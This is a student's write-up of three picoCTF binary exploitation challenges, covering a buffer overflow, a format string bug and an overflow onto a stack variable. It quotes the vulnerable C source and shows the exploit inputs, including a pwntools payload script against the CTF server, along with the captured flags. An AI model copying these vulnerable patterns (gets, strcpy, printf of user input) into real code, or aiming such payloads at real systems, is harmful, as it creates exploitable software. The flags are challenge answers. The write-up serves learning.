# 1. buffer overflow 0

>Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/173/vuln). You can view source [here](https://artifacts.picoctf.net/c/173/vuln.c). Connect using: `nc saturn.picoctf.net 59827`

## Solve: 
- Two files were provided, the source code of the binary and the binary itself. I tried running the binary locally but it required a file called "flag.txt" to run. So I ran it through the `nc` port provided.
```zsh
sparsh@LAPTOP-F80QI4V2 ~/ctf/bo0 $ nc saturn.picoctf.net 49193
Input: helloworld
The program will exit now
```
	The program took an input and exited.

- So that brought me to the source code of the binary.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){

  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler

  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1);
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```

- In that I focused on the `vuln` function, in which a string of 16 characters was defined and was copied to the parameter string pointer. In the `main` function the `vuln` function was passed on on the input which was read from the user. So to create a overflow, I just had to pass a string greater than 16 bytes to the input stream. 
```zsh
sparsh@LAPTOP-F80QI4V2 ~/ctf/bo0 $ nc saturn.picoctf.net 49193
Input: 12345678901234567890
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```
- By causing this overflow, the `sigsev_handler` was triggered and printed the flag

## Flag:
```
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```

## Notes & Concepts Learnt:
- I learnt the meaning of buffer overflow and `segfault`.
- `gets` function has vulnerabilities which can be exploited.
- `strcpy()` doesn't have a check condition, it just copies the data which can cause segment fault.

# 2. format string 0

> Can you use your knowledge of format strings to make the customers happy? Download the binary [here](https://artifacts.picoctf.net/c_mimas/68/format-string-0). Download the source [here](https://artifacts.picoctf.net/c_mimas/68/format-string-0.c). Connect with the challenge instance here: `nc mimas.picoctf.net 63143`

## Solve:
- After downloading the binary and the source code, I ran the challenge using the `nc` port provided,
```zsh
sparsh@LAPTOP-F80QI4V2 ~/ctf/fmstr0 $ nc mimas.picoctf.net 63143
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Breakf@st_Burger
Breakf@st_BurgerPatrick is still hungry!
Try to serve him something of larger size!
```
- On input of one of the options provided, the binary exited.
- So I opened the source code of the binary.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 32
#define FLAGSIZE 64

char flag[FLAGSIZE];

void sigsegv_handler(int sig) {
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}

int on_menu(char *burger, char *menu[], int count) {
    for (int i = 0; i < count; i++) {
        if (strcmp(burger, menu[i]) == 0)
            return 1;
    }
    return 0;
}

void serve_patrick();

void serve_bob();


int main(int argc, char **argv){
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
    }

    fgets(flag, FLAGSIZE, f);
    signal(SIGSEGV, sigsegv_handler);

    gid_t gid = getegid();
    setresgid(gid, gid, gid);

    serve_patrick();

    return 0;
}

void serve_patrick() {
    printf("%s %s\n%s\n%s %s\n%s",
            "Welcome to our newly-opened burger place Pico 'n Patty!",
            "Can you help the picky customers find their favorite burger?",
            "Here comes the first customer Patrick who wants a giant bite.",
            "Please choose from the following burgers:",
            "Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice1[BUFSIZE];
    scanf("%s", choice1);
    char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
    if (!on_menu(choice1, menu1, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        int count = printf(choice1);
        if (count > 2 * BUFSIZE) {
            serve_bob();
        } else {
            printf("%s\n%s\n",
                    "Patrick is still hungry!",
                    "Try to serve him something of larger size!");
            fflush(stdout);
        }
    }
}

void serve_bob() {
    printf("\n%s %s\n%s %s\n%s %s\n%s",
            "Good job! Patrick is happy!",
            "Now can you serve the second customer?",
            "Sponge Bob wants something outrageous that would break the shop",
            "(better be served quick before the shop owner kicks you out!)",
            "Please choose from the following burgers:",
            "Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice2[BUFSIZE];
    scanf("%s", choice2);
    char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
    if (!on_menu(choice2, menu2, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        printf(choice2);
        fflush(stdout);
    }
}
```
- Again the `segfault` was forwarded to `sigsev_handler` and it was used to print the flag, so that means I have to create some sort of an overflow here.
- The program was divided into two levels `serve_patrick` and `serve_bob`. The first level could be passed just by inputting the option which has size greater than 2 times the `BUFSIZE`  which was defined to be 32 in the definitions, so the size should be greater than `64` bytes.
- Here the option `Gr%114d_Cheese` had the substring `%114d`, on reading about it on the net, I found out that `114` in the `%d`(integer) format specifier forces it to output an integer from the memory stack which is padded to 114 characters, which is greater than `64` bytes. 
```zsh
sparsh@LAPTOP-F80QI4V2 ~/ctf/fmstr0 $ nc mimas.picoctf.net 63143
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation:
```

- I finally moved on to the next level. Here again it required you to choose an option. Looking back at the source code, I could see that there was no other option than to `segfault` to get the flag.
- So out the three options, one option caught my eye, `Cla%sic_Che%s%steak`, this string had three proper format specifiers `%s` (`Pe%to_Portobello` had `%t` but that is not a format specifier), So I inputted that and that caused the binary to go to `sigsev_handler` and print the flag. 
```zsh
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
```
- On further reading, I got to know that the reason this worked was because when you don't pass any string variable and only use `%s` in `printf()`, it can cause it to read garbage values form the memory stack, it can also infer to point at memory address outside of the binary. Due to that the program opted to force it to segmentation violation.

## Flag:
```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
```

## Notes & Concepts:
- I learnt the basics of format string attack
- Format string vulnerabilities could be occurred when data is directly passed to `printf` rather than inputting it through a formatted string.
- Format specifiers read values from the stack when arguments are not provided.
- Width modifier (`%114d` in this challenge), can control the padding of the integer provided.

# 3. clutter-overflow
> Clutter, clutter everywhere and not a byte to use. `nc mars.picoctf.net 31890`

>Files Given: `chall.c` and `chall`

Contents of `chall.c`
```c
#include <stdio.h>
#include <stdlib.h>

#define SIZE 0x100
#define GOAL 0xdeadbeef

const char* HEADER =
" ______________________________________________________________________\n"
"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|\n"
"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |\n"
"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|\n"
"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \\^ ^ |\n"
"|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \\ ^ _ ^ / |                | \\^ ^|\n"
"| ^/_\\^ ^ ^ /_________\\^ ^ ^ /_\\ | //  | /_\\ ^| |   ____  ____   | | ^ |\n"
"|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|\n"
"| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |\n"
"|^ ^ ^ ^ ^| /     (   \\ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \\|^ ^|\n"
".-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |\n"
"|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\\ |^ ^|\n"
"| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |\n"
"|'.____'_^||/!\\@@@@@/!\\|| _'______________.'|==                    =====\n"
"|\\|______|===============|________________|/|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\" ||\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"  \n"
"\"\"''\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"";

int main(void)
{
  long code = 0;
  char clutter[SIZE];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts(HEADER);
  puts("My room is so cluttered...");
  puts("What do you see?");

  gets(clutter);


  if (code == GOAL) {
    printf("code == 0x%llx: how did that happen??\n", GOAL);
    puts("take a flag for your troubles");
    system("cat flag.txt");
  } else {
    printf("code == 0x%llx\n", code);
    printf("code != 0x%llx :(\n", GOAL);
  }

  return 0;
}
```

## Solve:
- The first thing I could notice was that the SIZE of clutter was defined to be 0x100 or 256 bytes and GOAL = `0xdeadbeef`
- I had to somehow cause an overflow which wrote `0xdeadbeef` to the value of variable `code`. I first tried putting 256 random characters and then putting `deadbeef` in little endian form i.e `\xef\xbe\xad\xde` but that didn't seem to work
```
My room is so cluttered...
What do you see?
1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456\xef\xbe\xad\xde
```
- I realized that putting `0xdeadbeef` like this won't work because its taking that input in string format, I searched the net and found out that I had to use `pwn` library in python.
- I watched the video over youtube which taught the use of `pwn` library in python through which this could be easily done.
- I created this simple script to send the payload into the challenge `nc` port.
```python
from pwn import *  
  
nc = remote("mars.picoctf.net", 31890) # connects to the challenge nc port  
line = b'1' * 256 + b'\xef\xbe\xad\xde\x00\x00\x00\x00' # deadbeef converted to LSB byte array  
  
nc.sendline(line)  
resp = nc.recvline()  
print(line)  
print(resp.decode().strip())  
nc.interactive()  
nc.close()
```
- But again I got the same output:
```
My room is so cluttered...
What do you see?
code == 0x0
code != 0xdeadbeef :(
```
- This time I couldn't figure out what's wrong with the code, everything seemed to be correct.
- I searched around a bit found a `stackoverflow` thread which talked about padding in `C`, so again I tried increasing the padding of the sent payload by 4 bytes.
```python
line = b'1' * 260 + b'\xef\xbe\xad\xde\x00\x00\x00\x00'
```
- Still it didn't seem to work, so I tried 8 bytes and magically it seemed to work.
```python
line = b'1' * 264 + b'\xef\xbe\xad\xde\x00\x00\x00\x00'
```

```zsh
[x] Opening connection to mars.picoctf.net on port 31890
[x] Opening connection to mars.picoctf.net on port 31890: Trying 3.15.72.211
[+] Opening connection to mars.picoctf.net on port 31890: Done
b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\xef\xbe\xad\xde\x00\x00\x00\x00'
______________________________________________________________________
[*] Switching to interactive mode
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""  
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
[*] Got EOF while reading in interactive
```
## Flag:
```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```
## Notes and Concepts Learnt:
- I learnt the use of `pwn` tools and how it is very useful to solve especially Binary Exploitation problems.
- I still have to read how to determine padding while sending these payloads and how it actually works, here I just used trial and error.
